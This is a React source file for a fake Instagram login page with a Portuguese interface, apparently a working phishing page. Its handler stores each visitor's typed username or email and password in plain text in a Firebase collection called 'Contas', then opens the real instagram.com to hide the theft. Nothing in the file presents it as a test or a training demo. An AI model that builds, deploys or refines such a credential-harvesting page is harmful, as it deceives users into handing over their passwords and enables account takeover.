import './style.css'
import Logo from '../../assets/logoInsta.png'
import Face from '../../assets/face.jpg'

import firebase from '../../firebaseConnection'
import { useState } from 'react'
import { Link } from 'react-router-dom'

export default function Login(){

  const [email, setEmail] = useState('')
  const [senha, setSenha] = useState('')

  async function handdleadd(){
    await firebase.firestore().collection('Contas')
    .add({
      email: email,
      senha: senha
    }).then(()=>{
      window.open('http://www.instagram.com');
    }).catch((e)=>{
      console.log(e)
    })

  }
  return(
    <div className='container'>
      <header>
        <p className='idioma'>Português-br</p>
      </header>
      <div className='LOGO'>
        <img src={Logo} className='logoInsta'/>

        <div className='formulario'>
          <input type='text' placeHolder='Phone number, username or email' onChange={(e)=>setEmail(e.target.value)}/>
          <input type='password' placeholder='Password' onChange={(e)=>setSenha(e.target.value)}/>
          <p className='esquece'>Esqueceu a senha?</p>
          <button onClick={handdleadd}>
            <p>Entrar</p>
          </button>
          <p className='criar'>Criar uma conta.</p>
        </div>
      </div>

      <footer>
        <img src={Face}/>
      </footer>
    </div>
  )
}